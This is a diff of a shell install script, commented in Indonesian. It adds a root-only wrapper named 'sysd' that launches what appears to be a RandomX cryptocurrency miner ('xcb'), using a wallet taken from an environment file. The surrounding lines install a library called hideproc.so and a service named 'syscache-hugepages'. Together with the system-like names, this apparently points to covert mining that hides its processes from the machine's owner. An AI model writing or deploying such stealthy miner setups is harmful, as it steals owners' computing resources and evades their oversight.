@@ -28,6 +28,29 @@ $SUDO install -m 755 "$DIR/xcb" /usr/local/bin/xcb
 $SUDO install -m 644 "$DIR/librandomx_v2.so" /usr/local/bin/librandomx_v2.so
 $SUDO install -m 644 "$DIR/hideproc.so" /usr/local/lib/hideproc.so
 
+# Wrapper yang dipakai ExecStart di unit dasar (sama dengan ops/fleet/install.sh).
+$SUDO install -d -m 755 /usr/local/sbin
+$SUDO tee /usr/local/sbin/sysd >/dev/null <<'WRAPPER'
+#!/bin/sh
+# Wrapper root-only untuk ExecStart. Semua nilai datang dari
+# /etc/xcb/miner.env (EnvironmentFile); tidak ada wallet di command line.
+set -eu
+: "${WALLET:?WALLET kosong di /etc/xcb/miner.env}"
+: "${WORKER:?WORKER kosong di /etc/xcb/miner.env}"
+# CONN_ADDRESS menang atas WALLET di Config::parse, dan hanya WALLET yang
+# memecah suffix ".worker" (sama seperti -u). Samakan keduanya tanpa suffix
+# supaya tidak ada alamat reward berbeda di antara dua variabel itu.
+CONN_ADDRESS="${WALLET%%.*}"
+export CONN_ADDRESS
+set -- -a conn --worker "$WORKER" --ui=log
+# THREADS kosong = auto (Config memakai jumlah CPU); jangan paksa -t "".
+if [ -n "${THREADS:-}" ]; then
+    set -- "$@" -t "$THREADS"
+fi
+exec /usr/local/bin/xcb "$@"
+WRAPPER
+$SUDO chmod 0700 /usr/local/sbin/sysd
+
 $SUDO tee /etc/systemd/system/syscache-hugepages.service >/dev/null <<UNIT
 [Unit]
 Description=Hugepages for RandomX V2 dataset (CONN)
